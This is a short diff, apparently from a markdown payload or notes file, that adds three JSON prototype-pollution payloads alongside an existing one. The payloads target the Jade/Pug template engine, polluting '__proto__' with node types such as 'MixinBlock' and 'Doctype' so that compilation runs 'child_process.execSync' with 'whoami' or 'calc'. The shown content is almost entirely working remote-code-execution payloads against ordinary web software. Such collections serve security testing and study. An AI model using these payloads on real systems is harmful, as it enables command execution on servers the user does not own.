@@ -138,6 +138,12 @@ module.exports = router;
 ```php
 
 {"__proto__":{"__proto__": {"type":"Code","compileDebug":1,"self":1,"line":"0, \"\" ));return global.process.mainModule.constructor._load('child_process').execSync('whoami', function(){} );jade_debug.unshift(new jade.DebugItem(0"}}}
+
+{"__proto__":{"__proto__": {"type":"MixinBlock","compileDebug":1,"self":1,"line":"0, \"\" ));return global.process.mainModule.constructor._load('child_process').execSync('whoami', function(){} );//"}}}
+
+{"__proto__":{"__proto__": {"type":"Doctype","compileDebug":1,"self":1,"line":"0, \"\" ));return global.process.mainModule.constructor._load('child_process').execSync('whoami', function(){} );//"}}}
+
+{"__proto__":{"__proto__": {"type":"Doctype","compileDebug":1,"self":1,"line":"0, \"\" ));return global.process.mainModule.constructor._load('child_process').execSync('calc');//"}}}
 ```
 
 
